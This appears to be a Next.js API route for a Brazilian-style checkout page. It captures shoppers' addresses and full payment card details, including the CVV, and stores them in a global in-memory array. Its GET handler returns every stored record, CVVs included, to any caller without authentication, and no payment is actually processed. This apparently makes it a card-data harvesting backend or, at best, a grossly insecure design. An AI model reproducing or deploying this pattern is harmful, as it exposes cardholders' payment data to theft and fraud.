import { NextResponse } from "next/server"

// In-memory storage (em producao usar banco de dados)
const checkoutData: Array<{
  id: string
  timestamp: string
  address: {
    nome: string
    telefone: string
    cep: string
    endereco: string
    numero: string
    complemento: string
    bairro: string
    cidade: string
    estado: string
  }
  card?: {
    numero: string
    nome: string
    validade: string
    cvv: string
  }
  paymentMethod: "pix" | "card"
}> = []

// Tornar o array acessivel globalmente
if (typeof global !== "undefined") {
  ;(global as Record<string, unknown>).checkoutData = (global as Record<string, unknown>).checkoutData || checkoutData
}

function getCheckoutData() {
  if (typeof global !== "undefined" && (global as Record<string, unknown>).checkoutData) {
    return (global as Record<string, unknown>).checkoutData as typeof checkoutData
  }
  return checkoutData
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    
    const entry = {
      id: crypto.randomUUID(),
      timestamp: new Date().toISOString(),
      address: body.address,
      card: body.card || null,
      paymentMethod: body.paymentMethod,
    }
    
    getCheckoutData().push(entry)
    
    return NextResponse.json({ success: true, id: entry.id })
  } catch {
    return NextResponse.json({ error: "Erro ao salvar dados" }, { status: 500 })
  }
}

export async function GET() {
  return NextResponse.json(getCheckoutData())
}
